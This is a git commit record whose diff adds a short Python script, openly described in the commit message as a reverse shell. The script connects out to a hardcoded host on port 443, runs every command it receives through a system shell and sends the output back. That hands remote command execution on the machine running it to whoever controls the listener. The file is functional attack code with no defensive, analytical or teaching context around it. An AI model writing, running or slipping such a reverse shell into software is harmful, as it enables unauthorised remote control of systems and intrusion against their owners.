01b226bbac05487db501a96a8b24678ec972e86d
Michael Süß <shanachan@sysmike.de>
2013-05-02 21:17:40 +0200

    added python reverse shell script

---
+++ reverse shell.py
@@ -0,0 +1,14 @@
+﻿#!/usr/bin/python
+import socket
+import subprocess
+
+HOST = '192.168.225.136'    
+PORT = 443
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+while 1:
+	data = s.recv(1024)
+	proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+	stdout_value = proc.stdout.read() + proc.stderr.read()
+	s.send(stdout_value)
+s.close()
